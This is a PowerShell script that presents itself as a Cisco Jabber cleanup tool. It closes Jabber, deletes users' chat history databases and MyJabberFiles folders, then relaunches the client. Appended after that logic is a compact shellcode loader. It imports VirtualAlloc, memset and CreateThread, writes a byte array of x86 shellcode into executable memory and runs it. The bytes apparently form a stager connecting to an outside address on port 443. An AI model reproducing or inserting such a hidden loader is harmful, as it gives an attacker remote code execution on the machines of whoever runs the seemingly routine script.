
[CmdletBinding()]
param
(
	[switch]$SecureDelete,
	[string]$SecureDeletePasses = '3'
)

function Close-Process {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[ValidateNotNullOrEmpty()][string]$ProcessName
	)
	
	$Process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
	If ($Process -ne $null) {
		$Output = "Stopping " + $Process.Name + " process....."
		Stop-Process -Name $Process.Name -Force -ErrorAction SilentlyContinue
		Start-Sleep -Seconds 1
		$TestProcess = Get-Process $ProcessName -ErrorAction SilentlyContinue
		If ($TestProcess -eq $null) {
			$Output += "Success"
			Write-Host $Output
			Return $true
		} else {
			$Output += "Failed"
			Write-Host $Output
			Return $false
		}
	} else {
		Return $true
	}
}

function Get-Architecture {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$OSArchitecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture
	$OSArchitecture = $OSArchitecture.OSArchitecture
	Return $OSArchitecture
	
}

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
	Return $Path
}

function Open-Application {

	
	[CmdletBinding()]
	param
	(
		[string]$Executable,
		[ValidateNotNullOrEmpty()][string]$ApplicationName
	)
	
	$Architecture = Get-Architecture
	$Uninstall = Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
	If ($Architecture -eq "64-bit") {
		$Uninstall += Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
	}
	$InstallLocation = ($Uninstall | ForEach-Object {	Get-ItemProperty $_.PsPath } | Where-Object { $_.DisplayName -eq $ApplicationName }).InstallLocation
	If ($InstallLocation[$InstallLocation.Length - 1] -ne "\") {
		$InstallLocation += "\"
	}
	$Process = ($Executable.Split("."))[0]
	$Output = "Opening $ApplicationName....."
	Start-Process -FilePath $InstallLocation$Executable -ErrorAction SilentlyContinue
	Start-Sleep -Seconds 5
	$NewProcess = Get-Process $Process -ErrorAction SilentlyContinue
	If ($NewProcess -ne $null) {
		$Output += "Success"
	} else {
		$Output += "Failed"
	}
	Write-Output $Output
}

function Remove-ChatFiles {

	
	[CmdletBinding()]
	param ()
	
	$Users = Get-ChildItem -Path $env:HOMEDRIVE"\users" -Exclude 'Administrator', 'public', 'iCreateService', 'sccmadmin', 'Default'
	foreach ($User in $Users) {
		
		$History = $User.FullName + '\AppData\Local\Cisco\Unified Communications\Jabber\CSF\History'
		$ChatHistoryFiles = Get-ChildItem -Path $History -Filter *.db
		If ($ChatHistoryFiles -ne $null) {
			foreach ($File in $ChatHistoryFiles) {
				$Output = "Deleting " + $File.Name + "....."
				If ($SecureDelete.IsPresent) {
					$RelativePath = Get-RelativePath
					$sDelete = [char]34 + $env:windir + "\system32\" + "sdelete64.exe" + [char]34
					$Switches = "-accepteula -p" + [char]32 + $SecureDeletePasses + [char]32 + "-q" + [char]32 + [char]34 + $File.FullName + [char]34
					$ErrCode = (Start-Process -FilePath $sDelete -ArgumentList $Switches -Wait -PassThru).ExitCode
					If (($ErrCode -eq 0) -and ((Test-Path $File.FullName) -eq $false)) {
						$Output += "Success"
					} else {
						$Output += "Failed"
					}
				} else {
					Remove-Item -Path $File.FullName -Force | Out-Null
					If ((Test-Path $File.FullName) -eq $false) {
						$Output += "Success"
					} else {
						$Output += "Failed"
					}
				}
				Write-Output $Output
			}
		} else {
			$Output = "No Chat History Present"
			Write-Output $Output
		}
	}
}

function Remove-MyJabberFilesFolder {

	
	[CmdletBinding()]
	param ()
	
	$Users = Get-ChildItem -Path $env:HOMEDRIVE"\users" -Exclude 'Administrator', 'public', 'iCreateService', 'sccmadmin', 'Default'
	foreach ($User in $Users) {
		$Folder = $User.FullName + '\Documents\MyJabberFiles'
		$MyJabberFilesFolder = Get-Item $Folder -ErrorAction SilentlyContinue
		If ($MyJabberFilesFolder -ne $null) {
			$Output = "Deleting " + $MyJabberFilesFolder.Name + "....."
			Remove-Item -Path $MyJabberFilesFolder -Recurse -Force | Out-Null
			If ((Test-Path $MyJabberFilesFolder.FullName) -eq $false) {
				$Output += "Success"
			} else {
				$Output += "Failed"
			}
			Write-Output $Output
		} else {
			$Output = "No MyJabberFiles folder present"
			Write-Output $Output
		}
	}
}

Clear-Host

$JabberClosed = Close-Process -ProcessName CiscoJabber

Remove-ChatFiles

Remove-MyJabberFilesFolder

If ($JabberClosed -eq $true) {
	Open-Application -ApplicationName "Cisco Jabber" -Executable CiscoJabber.exe
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x83,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

